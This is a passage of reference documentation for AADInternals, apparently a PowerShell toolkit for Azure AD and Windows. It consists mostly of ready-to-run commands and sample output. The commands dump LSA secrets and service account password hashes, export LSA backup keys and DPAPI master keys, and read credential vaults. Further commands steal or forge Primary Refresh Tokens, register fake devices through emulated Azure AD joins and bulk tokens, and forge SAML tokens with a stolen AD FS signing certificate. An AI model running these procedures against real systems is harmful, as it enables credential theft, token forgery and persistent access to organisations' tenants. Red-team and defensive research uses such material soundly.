MD4         : {198, 74, 199, 231...}
SHA1        : {78, 213, 16, 126...}
MD4Txt      : c64ac7e7d2defe99afdf0026b79bbab9
SHA1Txt     : 4ed5107ee08123635f08390e106ed000f96273fd

Name        : _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_15030c93b7affb1fe7dc418b9dab42addf574c56b
			  3e7a83450fc4f3f8a382028
Account     : COMPANY\sv_ADFS
Password    : {213, 89, 245, 60...}
PasswordHex : d559f53cdc2aa6dffe32d6b23...
PasswordTxt : 姕㳵⫝̸�㋾닖�स䥥⫮Ꭸ베꺻ᢆ㒍梩神蔼廄...
Credentials : System.Management.Automation.PSCredential
MD4         : {223, 4, 60, 193...}
SHA1        : {86, 201, 125, 70...}
MD4Txt      : df043cc10709bd9f94aa273ec7a54b68
SHA1Txt     : 56c97d46b5072ebb8c5c7bfad4b8c1c18f3b48d0
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get LSA secret for the given account</span>
<span class="nb">Get-AADIntLSASecrets</span> <span class="n">-AccountName</span> <span class="n">COMPANY</span><span class="p">\</span><span class="n">AAD_5baf82738e9c</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Name        : _SC_ADSync
Account     : COMPANY\AAD_5baf82738e9c
Password    : {41, 0, 45, 0...}
PasswordHex : 29002d004e0024002a00...
PasswordTxt : )-N$*s=322jSQnm-YG#z2z...
Credentials : System.Management.Automation.PSCredential
MD4         : {81, 210, 222, 155...}
SHA1        : {94, 74, 122, 142...}
MD4Txt      : 51d2de9b89b81d0cb371a829a2d19fe2
SHA1Txt     : 5e4a7a8e220652c11cf64d25b1dcf63da7ce4bf1
</code></pre>

<p><strong>Example 3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get LSA secret for the given account</span>
<span class="nb">Get-AADIntLSASecrets</span> <span class="n">-AccountName</span> <span class="n">COMPANY</span><span class="p">\</span><span class="n">sv_ADFS</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Name        : _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_15030c93b7affb1fe7dc418b9dab42addf574c56b3e7a83450fc4f3f8a382028
Account     : COMPANY\sv_ADFS
Password    : {213, 89, 245, 60...}
PasswordHex : d559f53cdc2aa6dffe32d6b23...
PasswordTxt : 姕㳵⫝̸�㋾닖�स䥥⫮Ꭸ베꺻ᢆ㒍梩神蔼廄...
Credentials : System.Management.Automation.PSCredential
MD4         : {223, 4, 60, 193...}
SHA1        : {86, 201, 125, 70...}
MD4Txt      : df043cc10709bd9f94aa273ec7a54b68
SHA1Txt     : 56c97d46b5072ebb8c5c7bfad4b8c1c18f3b48d0
</code></pre>

<h3 id="get-aadintlsabackupkeys">Get-AADIntLSABackupKeys (*)</h3>

<p>Since version 0.3.0 <br>
Gets Local Security Authority (LSA) backup keys which can be used to decrypt secrets of all users encrypted with DPAPI.
MUST be run as an administrator.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get LSA backup keys</span>
<span class="nb">Get-AADIntLSABackupKeys</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>certificate     Name   Id                                   Key                   
-----------     ----   --                                   ---                   
{1, 2, 3, 4...} RSA    e783c740-2284-4bd6-a121-7cc0d39a5077 {231, 131, 199, 64...}
				Legacy ff127a05-51b1-4d45-8655-30c883631d90 {255, 18, 122, 5...}
</code></pre>

<h3 id="get-aadintsystemmasterkeys">Get-AADIntSystemMasterKeys (*)</h3>

<p>Since version 0.3.0 <br>
Gets local system master keys with the given system backup key (LSA backup key).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the LSA backup keys</span>
<span class="nv">$lsabk_keys</span><span class="p">=</span><span class="nb">Get-AADIntLSABackupKeys</span>

<span class="c"># Save the private key to a variable</span>
<span class="nv">$rsa_key</span><span class="p">=</span><span class="nv">$lsabk_keys</span> <span class="p">|</span> <span class="nb">where </span><span class="n">name</span> <span class="o">-eq</span> <span class="n">RSA</span>

<span class="c"># Get system master keys</span>
<span class="nb">Get-AADIntSystemMasterkeys</span> <span class="n">-SystemKey</span> <span class="nv">$rsa_key</span><span class="p">.</span><span class="n">key</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Name                           Value
----                           -----
ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
</code></pre>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the LSA backup keys</span>
<span class="nv">$lsabk_keys</span><span class="p">=</span><span class="nb">Get-AADIntLSABackupKeys</span>

<span class="c"># Save the private key to a variable</span>
<span class="nv">$rsa_key</span><span class="p">=</span><span class="nv">$lsabk_keys</span> <span class="p">|</span> <span class="nb">where </span><span class="n">name</span> <span class="o">-eq</span> <span class="n">RSA</span>

<span class="c"># Get user's master keys</span>
<span class="nb">Get-AADIntUserMasterkeys</span> <span class="n">-UserName</span> <span class="s2">"myuser"</span> <span class="n">-SID</span> <span class="s2">"S-1-5-xxxx"</span> <span class="n">-SystemKey</span> <span class="nv">$rsa_key</span><span class="p">.</span><span class="n">key</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Name                           Value
----                           -----
ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
8a26d304-198c-4495-918f-77b...
</code></pre>

<h3 id="get-aadintusermasterkeys">Get-AADIntUserMasterKeys (*)</h3>

<p>Since version 0.3.0 <br>
Gets user’s master keys using the password or system backup key (LSA backup key).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get user's master keys with username and password</span>
<span class="nb">Get-AADIntUserMasterkeys</span> <span class="n">-UserName</span> <span class="s2">"myuser"</span> <span class="n">-SID</span> <span class="s2">"S-1-5-xxxx"</span> <span class="n">-Password</span> <span class="s2">"password"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Name                           Value
----                           -----
ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
8a26d304-198c-4495-918f-77b... {166, 95, 5, 216...}
</code></pre>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get user's master keys using LSA backup key</span>
<span class="c"># Get the LSA backup keys</span>
<span class="nv">$lsabk_keys</span><span class="p">=</span><span class="nb">Get-AADIntLSABackupKeys</span>

<span class="c"># Save the private key to a variable</span>
<span class="nv">$rsa_key</span><span class="p">=</span><span class="nv">$lsabk_keys</span> <span class="p">|</span> <span class="nb">where </span><span class="n">name</span> <span class="o">-eq</span> <span class="n">RSA</span>

<span class="c"># Get user's master keys</span>
<span class="nb">Get-AADIntUserMasterkeys</span> <span class="n">-UserName</span> <span class="s2">"myuser"</span> <span class="n">-SID</span> <span class="s2">"S-1-5-xxxx"</span> <span class="n">-SystemKey</span> <span class="nv">$rsa_key</span><span class="p">.</span><span class="n">key</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Name                           Value
----                           -----
ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
8a26d304-198c-4495-918f-77b...
</code></pre>

<h3 id="get-aadintlocalusercredentials">Get-AADIntLocalUserCredentials (*)</h3>

<p>Since version 0.3.0 <br>
Gets user’s credentials from the local credential vault.</p>

<p><strong>Note:</strong> Currently supports only SHA1 hashing and 3DES encryption algorithms, so probably fails for “normal” users.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the LSA backup keys</span>
<span class="nv">$lsabk_keys</span><span class="p">=</span><span class="nb">Get-AADIntLSABackupKeys</span>

<span class="c"># Save the private key to a variable</span>
<span class="nv">$rsa_key</span><span class="p">=</span><span class="nv">$lsabk_keys</span> <span class="p">|</span> <span class="nb">where </span><span class="n">name</span> <span class="o">-eq</span> <span class="n">RSA</span>

<span class="c"># Get user's master keys</span>
<span class="nv">$user_masterkeys</span><span class="p">=</span><span class="nb">Get-AADIntUserMasterkeys</span> <span class="n">-UserName</span> <span class="s2">"myuser"</span> <span class="n">-SID</span> <span class="s2">"S-1-5-xxxx"</span> <span class="n">-SystemKey</span> <span class="nv">$rsa_key</span><span class="p">.</span><span class="n">key</span>

<span class="c"># List user's credentials</span>
<span class="nb">Get-AADIntLocalUserCredentials</span> <span class="n">-UserName</span> <span class="s2">"myuser"</span> <span class="n">-MasterKeys</span> <span class="nv">$user_masterkeys</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Target        : LegacyGeneric:target=msTeams_autologon.microsoftazuread-sso.com:443/user@company.com
Persistance   : local_machine
Edited        : 26/03/2020 10.12.11
Alias         : 
Comment       : 
UserName      : 
Secret        : {97, 115, 100, 102...}
SecretTxt     : 獡晤晤
SecretTxtUtf8 : asdfdf
Attributes    : {}
</code></pre>

<h2 id="hack-functions-azure-ad-join-mdm-prt">Hack functions: Azure AD join, MDM &amp; PRT</h2>

<h3 id="get-aadintuserprttoken">Get-AADIntUserPRTToken (*)</h3>

<p>Since version 0.4.1 <br>
Gets user’s PRT token from the Azure AD joined or Hybrid joined computer. Uses BrowserCore.exe to get the PRT token.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the PRToken</span>
<span class="nv">$prtToken</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTToken</span>

<span class="c"># Get an access token for AAD Graph API and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-PRTToken</span> <span class="nv">$prtToken</span>
</code></pre></div>
<p></p>

<h3 id="join-aadintonpremdevicetoazuread-a">Join-AADIntOnPremDeviceToAzureAD (A)</h3>

<p>Since version 0.4.5 <br>
Emulates Azure AD Hybrid Join by adding a device to Azure AD via Synchronization API and generates a corresponding certificate (if not provided).</p>

<p>You may use any name, SID, device ID, or certificate you like.</p>

<p>The generated certificate can be used to complete the Hybrid Join using Join-AADIntDeviceToAzureAD. The certificate has no password.</p>

<p>After the synchronisation, the device appears as “Hybrid Azure AD joined” device which registration state is “Pending”. The subject of the certificate must be “CN=<deviceid>” or the Hybrid Join fails.</deviceid></p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Join the device to Azure AD</span>
<span class="nb">Join-AADIntOnPremDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device successfully created:
  Device Name:     "My computer"
  Device ID:       f24f116f-6e80-425d-8236-09803da7dfbe
  Device SID:      S-1-5-21-685966194-1071688910-211446493-3729
  Cloud Anchor:    Device_e049c29d-8c8f-4016-b959-98f3fccd668c
  Source Anchor:   bxFP8oBuXUKCNgmAPaffvg==
  Cert thumbprint: C59B20BCDE103F8B7911592FD7A8DDDD22696CE0
  Cert file name:  "f24f116f-6e80-425d-8236-09803da7dfbe-user.pfx"
</code></pre>

<h3 id="join-aadintdevicetoazuread-j">Join-AADIntDeviceToAzureAD (J)</h3>

<p>Since version 0.4.1 <br>
Emulates Azure AD Join by registering the given device to Azure AD and generates a corresponding certificate. Supports also Hybrid Join since version 0.4.5 and Register since 0.4.6.</p>

<p>You may use any name, type or OS version you like.</p>

<p>The generated certificate can be used to create a Primary Refresh Token and P2P certificates. The certificate has no password.</p>

<p><strong>Example 1 - Register:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token for AAD join and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-SaveToCache</span>

<span class="c"># Register the device to Azure AD</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">"My first computer"</span> <span class="n">-DeviceType</span> <span class="s2">"Commodore"</span> <span class="n">-OSVersion</span> <span class="s2">"Vic20"</span> <span class="n">-JoinType</span> <span class="n">Register</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device successfully registered to Azure AD:
  DisplayName:     "My first computer"
  DeviceId:        f6579fb2-8175-4508-95a7-ef11351983ee
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: A5B3A73FADF00D448025236BDFA389D8A5B3A73F
  Cert file name : "f6579fb2-8175-4508-95a7-ef11351983ee.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
</code></pre>

<p><strong>Example 2 - Join:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token for AAD join and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-SaveToCache</span>

<span class="c"># Join the device to Azure AD</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span> <span class="n">-DeviceType</span> <span class="s2">"Commodore"</span> <span class="n">-OSVersion</span> <span class="s2">"C64"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
</code></pre>

<p><strong>Example 3 - Hybrid Join:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Join the device to Azure AD</span>
<span class="nb">Join-AADIntOnPremDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device successfully created:
  Device Name:     "My computer"
  Device ID:       f24f116f-6e80-425d-8236-09803da7dfbe
  Device SID:      S-1-5-21-685966194-1071688910-211446493-3729
  Cloud Anchor:    Device_e049c29d-8c8f-4016-b959-98f3fccd668c
  Source Anchor:   bxFP8oBuXUKCNgmAPaffvg==
  Cert thumbprint: C59B20BCDE103F8B7911592FD7A8DDDD22696CE0
  Cert file name:  "f24f116f-6e80-425d-8236-09803da7dfbe-user.pfx"
</code></pre>

<p></p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Hybrid Join the device to Azure AD</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-TenantId</span> <span class="n">4362599e-fd46</span><span class="p">-</span><span class="n">44a9</span><span class="p">-</span><span class="n">997d</span><span class="p">-</span><span class="n">53bc7a3b2947</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span> <span class="n">-SID</span> <span class="s2">"S-1-5-21-685966194-1071688910-211446493-3729"</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">f24f116f</span><span class="p">-</span><span class="n">6e80</span><span class="p">-</span><span class="n">425d</span><span class="p">-</span><span class="n">8236</span><span class="p">-</span><span class="n">09803da7dfbe-user</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        f24f116f-6e80-425d-8236-09803da7dfbe
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: A531B73CFBAB2BA26694BA2AD31113211CC2174A
  Cert file name : "f24f116f-6e80-425d-8236-09803da7dfbe.pfx"
</code></pre>

<p><strong>Example 4 - Hybrid Join by federation:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export AD FS token signing certificate</span>
<span class="nb">Export-AADIntADFSSigningCertificate</span>

<span class="c"># Get AD FS issuer uri</span>
<span class="nv">$issuer</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-AdfsProperties</span><span class="p">).</span><span class="n">Identifier</span><span class="p">.</span><span class="n">OriginalString</span>

<span class="c"># Create a new SAML token</span>
<span class="nv">$saml</span> <span class="p">=</span> <span class="nb">New-AADIntSAMLToken</span> <span class="n">-UserName</span> <span class="s2">"DESKTOP-9999"</span> <span class="n">-DeviceGUID</span> <span class="p">(</span><span class="nb">New-Guid</span><span class="p">)</span> <span class="n">-Issuer</span> <span class="nv">$issuer</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">ADFSSigningCertificate</span><span class="p">.</span><span class="n">pfx</span>

<span class="c"># Get an access token for the device with the SAML token</span>
<span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-SAMLToken</span> <span class="nv">$saml</span> <span class="n">-Device</span> <span class="n">-SaveToCache</span>

<span class="c"># Hybrid join the device</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">"DESKTOP-9999"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device successfully registered to Azure AD:
  DisplayName:     "DESKTOP-9999"
  DeviceId:        0810056c-d2d5-4c1b-bc17-2f2fbedd6ca3
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: 3022FF7937C0766CE3DB0AD45C9413FB68A05EE3
  Cert file name : "0810056c-d2d5-4c1b-bc17-2f2fbedd6ca3.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-3240472016-1160587922-3614255014-3410032901
  S-1-12-1-2566832563-1141717763-392342924-578657198
</code></pre>

<h3 id="get-aadintuserprtkeys">Get-AADIntUserPRTKeys (*)</h3>

<p>Since version 0.4.1 <br>
Creates a new set of Primary Refresh Token (PRT) keys for the user, including a session key and a refresh_token (PRT).
Keys are saved to a json file.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token for AAD join and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-SaveToCache</span>

<span class="c"># Join the device to Azure AD</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span> <span class="n">-DeviceType</span> <span class="s2">"Commodore"</span> <span class="n">-OSVersion</span> <span class="s2">"C64"</span>
</code></pre></div>
<p></p>

<pre><code>Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get user's credentials</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">Get-Credential</span>

<span class="c"># Get new PRT and key</span>
<span class="nv">$prtKeys</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTKeys</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-Credentials</span> <span class="nv">$cred</span>
</code></pre></div>


<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token for AAD join and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-SaveToCache</span>

<span class="c"># Join the device to Azure AD</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span> <span class="n">-DeviceType</span> <span class="s2">"Commodore"</span> <span class="n">-OSVersion</span> <span class="s2">"C64"</span>
</code></pre></div>
<p></p>

<pre><code>Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token for MDM and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForIntuneMDM</span> <span class="n">-SaveToCache</span>

<span class="c"># Get new PRT and key</span>
<span class="nv">$prtKeys</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTKeys</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-UseRefreshToken</span>
</code></pre></div>


<p><strong>Example 3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export the local device certificate and transport keys</span>
<span class="nb">Export-AADIntLocalDeviceCertificate</span>
<span class="nb">Export-AADIntLocalDeviceTransportKey</span>
</code></pre></div>
<p></p>

<pre><code>Device certificate exported to f72ad27e-5833-48d3-b1d6-00b89c429b91.pfx
Transport key exported to f72ad27e-5833-48d3-b1d6-00b89c429b91_tk.pem
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Save credentials (omit if MFA required or you need MFA claim)</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">Get-Credential</span>

<span class="c"># Get new PRT and session key</span>
<span class="nv">$prtKeys</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTKeys</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">f72ad27e</span><span class="p">-</span><span class="n">5833</span><span class="p">-</span><span class="n">48d3-b1d6</span><span class="p">-</span><span class="n">00b89c429b91</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-TransportKeyFileName</span> <span class="p">.\</span><span class="n">f72ad27e</span><span class="p">-</span><span class="n">5833</span><span class="p">-</span><span class="n">48d3-b1d6</span><span class="p">-</span><span class="n">00b89c429b91_tk</span><span class="p">.</span><span class="n">pem</span> <span class="n">-Credentials</span> <span class="nv">$creds</span>

<span class="c"># Get PRT token</span>
<span class="nv">$prttoken</span> <span class="p">=</span> <span class="nb">New-AADIntUserPRTToken</span> <span class="n">-Settings</span> <span class="nv">$prtkeys</span> <span class="n">-GetNonce</span>
</code></pre></div>


<p><strong>Example 4:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get user credentials</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">Get-Credential</span>

<span class="c"># Get PRT and Session key from CloudAP cache</span>
<span class="nv">$prtKeys</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTKeys</span> <span class="n">-CloudAP</span> <span class="n">-Credentials</span> <span class="nv">$creds</span>
</code></pre></div>
<p></p>

<pre><code>WARNING: Elevating to LOCAL SYSTEM. You MUST restart PowerShell to restore AzureAD\User1 rights.
Keys saved to 31abceff-a84c-4f3b-9461-582435d7d448.json
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Use the PRT and Session key to create PRTToken</span>
<span class="nv">$prttoken</span> <span class="p">=</span> <span class="nb">New-AADIntUserPRTToken</span> <span class="n">-Settings</span> <span class="nv">$prtkeys</span>
</code></pre></div>


<h3 id="new-aadintuserprttoken">New-AADIntUserPRTToken (*)</h3>

<p>Since version 0.4.1 <br>
Creates a new Primary Refresh Token (PRT) as JWT to be used to sign-in as the user.</p>

<p><strong>Example</strong> (continuing the previous example):
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Generate a new PRT token</span>
<span class="nv">$prtToken</span> <span class="p">=</span> <span class="nb">New-AADIntUserPRTToken</span> <span class="n">-Settings</span> <span class="nv">$prtKeys</span> <span class="n">-GetNonce</span>

<span class="c"># Get the access token using the PRT token</span>
<span class="nv">$at</span> <span class="p">=</span> <span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-PRTToken</span> <span class="nv">$prtToken</span>
</code></pre></div>
<p></p>

<h3 id="new-aadintbulkprttoken-a">New-AADIntBulkPRTToken (A)</h3>

<p>Since version 0.4.5 <br>
Creates a new BPRT (Bulk AAD PRT Token) for registering multiple devices to AAD.
Adds a corresponding user to Azure AD with UPN “package_<guid>@<default domain="">”.
The Display Name of the user can be defined.</default></guid></p>

<p>The BPRT will be returned as a string and saved to a .json file.</p>

<p><strong>Example</strong>:
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-Resource</span> <span class="n">urn</span><span class="p">:</span><span class="n">ms-drs</span><span class="p">:</span><span class="n">enterpriseregistration</span><span class="p">.</span><span class="n">windows</span><span class="p">.</span><span class="n">net</span> <span class="n">-SaveToCache</span>

<span class="c"># Create a new BPRT</span>
<span class="nv">$bprt</span> <span class="p">=</span> <span class="nb">New-AADIntBulkPRTToken</span> <span class="n">-Name</span> <span class="s2">"My BPRT user"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>BPRT saved to package_8eb8b873-2b6a-4d55-bd96-27b0abadec6a-BPRT.json
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token for AAD Join using BPRT</span>
<span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-BPRT</span> <span class="nv">$BPRT</span> <span class="n">-SaveToCache</span>

<span class="c"># Join the device to Azure AD</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span>
</code></pre></div>


<pre><code>Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token for Intune using BPRT and Azure AD device certificate</span>
<span class="nb">Get-AADIntAccessTokenForIntuneMDM</span> <span class="n">-BPRT</span> <span class="nv">$BPRT</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">d03994c9</span><span class="p">-</span><span class="n">24f8</span><span class="p">-</span><span class="n">41ba-a156</span><span class="p">-</span><span class="n">1805998d6dc7</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-SaveToCache</span>

<span class="c"># Enroll the device to Intune</span>
<span class="nb">Join-AADIntDeviceToIntune</span> <span class="n">-DeviceName</span> <span class="s2">"My computer"</span>
</code></pre></div>


<pre><code>Intune client certificate successfully created:
  Subject:         "CN=5ede6e7a-7b77-41bd-bfe0-ef29ca70a3fb"
  Issuer:          "CN=Microsoft Intune MDM Device CA"
  Cert thumbprint: A1D407FF66EF05D153B67129B8541058A1C395B1
  Cert file name:  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx"
  CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-CA.der"
  IntMedCA file :  "d03994c9-24f8-41ba-a156-1805998d6dc7-MDM-INTMED-CA.der"
</code></pre>

<h3 id="new-aadintp2pdevicecertificate">New-AADIntP2PDeviceCertificate (*)</h3>

<p>Since version 0.4.1 <br>
Creates a new peer-to-peer (P2P) device or user certificate and exports it and the corresponding CA certificate. It can be used to enable RDP trust between devices of the same AAD tenant.</p>

